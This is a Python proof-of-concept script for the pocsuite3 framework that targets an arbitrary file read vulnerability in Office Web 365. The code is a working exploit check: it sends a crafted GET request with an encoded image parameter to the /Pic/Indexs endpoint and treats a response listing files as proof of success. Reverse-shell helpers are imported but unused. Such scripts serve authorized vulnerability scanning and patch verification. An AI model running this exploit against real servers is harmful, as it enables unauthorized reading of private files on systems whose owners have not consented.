# _*_ coding:utf-8 _*_
# @Time : 2024/1/3

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class OfficeWeb365_Pic(POCBase):
    pocDesc = '''Office Web 365 任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-01-03'
    name = 'Office Web 365 任意文件读取漏洞'

    def _verify(self):

        result = {}
        path = """/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "DNT": '1',
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            'Connection': 'close',
            "Upgrade-Insecure-Requests": "1"
        }
        url = self.url + path

        try:
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200 and 'files' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(OfficeWeb365_Pic)